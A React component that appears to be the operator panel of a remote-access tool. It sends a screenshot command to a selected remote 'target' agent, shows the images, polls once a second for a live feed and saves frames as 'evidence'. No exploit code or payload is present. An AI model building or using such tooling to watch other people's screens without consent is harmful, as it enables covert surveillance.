import React, { useState, useEffect, useRef } from 'react';
import { Camera, Download, Video, VideoOff, Loader2, Scan } from 'lucide-react';
import { useSocket } from '../contexts/SocketContext';
import { sendCommand } from '../services/socketService';
import { CyberCard, CyberButton } from './CyberUI';

export default function ScreenshotCard() {
    const [screenshot, setScreenshot] = useState<string | null>(null);
    const [loading, setLoading] = useState(false);
    const [isRecording, setIsRecording] = useState(false);
    const recordingInterval = useRef<NodeJS.Timeout | null>(null);
    const { socket, isConnected, selectedAgentId } = useSocket();

    useEffect(() => {
        if (!socket) return;
        socket.on("ReceiveScreenshot", (base64) => {
            setScreenshot(`data:image/png;base64,${base64}`);
            setLoading(false);
        });
        socket.on("ReceiveScreenshotError", (err) => {
            setLoading(false);
            if(isRecording) stopRecording();
            else alert("ERROR: " + err);
        });
        return () => { socket.off("ReceiveScreenshot"); socket.off("ReceiveScreenshotError"); };
    }, [socket, isRecording]);

    const handleSnapshot = async (silent = false) => {
        if (!isConnected || !selectedAgentId) return !silent && alert('⚠ NO UPLINK!');
        if (!silent) setLoading(true);
        try { await sendCommand('take_screenshot'); } catch (e) { setLoading(false); }
    };

    const toggleRecording = () => isRecording ? stopRecording() : startRecording();
    
    const startRecording = () => {
        if (!selectedAgentId) return alert("⚠ SELECT TARGET FIRST!");
        setIsRecording(true);
        handleSnapshot(true);
        recordingInterval.current = setInterval(() => handleSnapshot(true), 1000);
    };

    const stopRecording = () => {
        setIsRecording(false);
        if (recordingInterval.current) clearInterval(recordingInterval.current);
    };

    useEffect(() => () => stopRecording(), []);

    const download = () => {
        if (!screenshot) return;
        const link = document.createElement('a');
        link.href = screenshot;
        link.download = `EVIDENCE_${Date.now()}.png`;
        link.click();
    };

    return (
        <CyberCard title="SURVEILLANCE_FEED" className="h-full flex flex-col">
            <div className="flex justify-between items-center mb-2 px-2 text-[10px] font-mono border-b border-gray-800 pb-2">
                <div className="flex items-center gap-2">
                    <div className={`w-2 h-2 rounded-full ${isRecording ? 'bg-cyber-red animate-pulse' : 'bg-cyber-blue'}`}></div>
                    <span className={isRecording ? 'text-cyber-red font-bold' : 'text-cyber-blue'}>{isRecording ? 'REC ● LIVE' : 'STANDBY'}</span>
                </div>
            </div>
            <div className="relative flex-1 bg-black border border-gray-800 min-h-[250px] overflow-hidden">
                {screenshot ? (
                    <img src={screenshot} className="w-full h-full object-contain" />
                ) : (
                    <div className="absolute inset-0 flex flex-col items-center justify-center opacity-50">
                        {loading ? <Loader2 className="w-10 h-10 text-cyber-yellow animate-spin" /> : <Scan className="w-16 h-16 text-gray-600" />}
                    </div>
                )}
            </div>
            <div className="grid grid-cols-12 gap-2 mt-4">
                <div className="col-span-5"><CyberButton onClick={() => handleSnapshot(false)} disabled={loading || isRecording} className="w-full py-3 text-xs"><Camera className="w-4 h-4 mr-1" /> SNAPSHOT</CyberButton></div>
                <div className="col-span-5"><CyberButton onClick={toggleRecording} variant={isRecording ? "danger" : "secondary"} className="w-full py-3 text-xs">{isRecording ? <><VideoOff className="w-4 h-4 mr-1" /> STOP</> : <><Video className="w-4 h-4 mr-1" /> LIVE FEED</>}</CyberButton></div>
                <div className="col-span-2"><CyberButton onClick={download} disabled={!screenshot} variant="ghost" className="w-full py-3 px-0 flex justify-center"><Download className="w-4 h-4" /></CyberButton></div>
            </div>
        </CyberCard>
    );
}